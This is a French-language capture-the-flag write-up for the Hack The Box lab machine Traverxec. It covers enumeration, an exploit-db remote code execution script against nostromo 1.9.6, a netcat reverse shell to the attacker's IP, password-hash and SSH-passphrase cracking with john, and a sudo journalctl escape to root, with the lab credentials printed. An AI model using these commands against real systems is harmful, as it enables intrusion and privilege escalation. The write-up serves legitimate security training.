![Pic1](../img/traverxec1.PNG?raw=true) </br>

# Présentation
Traverxec est une box Linux dont l'adresse IP est 10.10.10.165.</br>

Compétences mises en oeuvre :</br>
* Enumération des ports et services d'une machine distante.
* Enumération des dossiers et fichiers d'un site web.
* Identifier site web vulnérable.
* Recherche et exploitation d'un exploit.
* Utilisation de id_rsa pour se connecter sans mot de passe.
* Elévation de privilège via une commande en sudo.
</br>

# Enumération initiale

Nous commençons l'énumération par les ports et services disponibles avec nmap :
```bash
$ nmap -T4 -A 10.10.10.165
```
![Pic2](../img/traverxec2.PNG?raw=true) </br>
Deux ports sont ouverts :</br>
* 22 pour un OpenSSH en version 7.9
* 80 pour un serveur web nostromo en version 1.9.6
</br>

Nous allons faire une énumération des fichiers et dossiers présents sur le site web avec dirsearch :  
```bash
$ dirsearch -w wordlist -e "php,txt" -f -t 100 -x 400,403,404,501 -u http://10.10.10.165/
```
![Pic3](../img/traverxec3.PNG?raw=true) </br>

# Obtenir un accès utilisateur
Nous avons vu que le serveur web en écoute était un nostromo 1.9.6, ce qui n'est pas commun, nous allons voir s'il existe un exploit pour 
cette version avec searchsploit :
```bash
$ searchsploit nostromo
```
![Pic4](../img/traverxec4.PNG?raw=true) </br>

Nous allons chercher la RCE qui correspond à la version de nostromo et l'executer :
```bash
$ locate 47837.py
$ cp /usr/share/exploitdb/exploits/multiple/remote/47837.py ./
$ cat 47837.py
```
![Pic5](../img/traverxec5.PNG?raw=true) </br>
Pour l'utiliser, il faut mettre en argumant l'ip de la box + son port + la commande à exécuter, donc nous testons :
```bash
$ python 47837.py 10.10.10.165 80 hostname
```
![Pic6](../img/traverxec6.PNG?raw=true) </br>
Nous allons alors utiliser le netcat de la box pour obtenir un shell :
```bash
# Nous mettons un listener sur notre machine :
$ nc -lvnp 4567
# Toujours sur notre machine mais sur un autre shell :
$ python 47837.py 10.10.10.165 80 "nc 10.10.14.6 4567 -c bash"
```
![Pic7](../img/traverxec7.PNG?raw=true) </br>
Nous avons un shell en tant que www-data, nous allons faire de l'énumération de base :
```bash
$ python -c "import pty;pty.spawn('/bin/bash')"
$ find / -type d -perm 0755 2>/dev/null
```
![Pic8](../img/traverxec8.PNG?raw=true) </br>
Un résultat (non-exhaustif) plutot dense mais nous pouvons voir que nous avons accès a plusieurs fichiers de Nostromo, y compris son fichier de configuration nhttpd.conf :
```bash
$ cat /var/nostromo/conf/nhttpd.conf
$ cat /var/nostromo/conf/.htpasswd
```
![Pic9](../img/traverxec9.PNG?raw=true) </br>
Le fichier nhttpd.conf va lire le mot de passe de l'utilisateur david dans le fichier .htpasswd, grâce à lui nous avons son hash, que nous crackons avec john :
```bash
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
![Pic10](../img/traverxec10.PNG?raw=true) </br>
Nous avons donc un utilisateur et son mot de passe : david:Nowonly4me</br>
Malheureusement, ce mot de passe n'est que pour le serveur web Nostromo. Néanmoins, dans le fichier nhttpd.conf, il y a un répertoire public_www de spécifié. Nous allons
donc commencer l'énumération par là-bas :
```bash
$ ls -aril /home/david/public_www
```
![Pic11](../img/traverxec11.PNG?raw=true) </br>
Nous voyons un dossier protected-file-area qui contient une archive que nous allons dézipper :
```bash
$ ls protected-file-area
$ cd protected-file-area
$ cp backup-ssh-identity-files.tgz /tmp/
$ tar zxvf /tmp/backup-ssh-identity-files.tgz
```
![Pic12](../img/traverxec12.PNG?raw=true) </br>
Des fichiers concernant ssh, nous pouvons alors récupérer id_rsa pour se connecter à distance sur la machine en ssh, il va falloir cracker la passphrase avec john :
```bash
$ ssh2john.py id_rsa > passphrase_hash
$ john passphrase_hash --wordlist=/usr/share/wordlists/rockyou.txt
```
![Pic13](../img/traverxec13.PNG?raw=true) </br>
Nous pouvons alors nous connecter en tant que david en ssh et récupérer le user.txt :
```
$ cmod 600 id_rsa
$ ssh -i id_rsa david@10.10.10.165
passphrase : hunter
```
![Pic14](../img/traverxec14.PNG?raw=true) </br>

# Obtenir un accès root
Dans le /home de david, un dossier bin est présent, il contient :
```bash
$ cd bin
$ ls -aril
```
![Pic15](../img/traverxec15.PNG?raw=true) </br>
Voici ce que contient les fichiers :
```bash
$ cat server-stats.head
$ cat server-stats.sh
```
![Pic16](../img/traverxec16.PNG?raw=true) </br>
Apparament, en tant que David, nous pouvons utiliser la commande journalctl avec sudo en gardant la syntaxe vu dans le fichier. Nous allons donc chercher sur le site GTFOBin un moyen d'obtenir un
shell root avec la commande en sudo :
```bash
$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.services
!/bin/sh
# cat /root/root.txt
```
![Pic17](../img/traverxec17.PNG?raw=true) </br>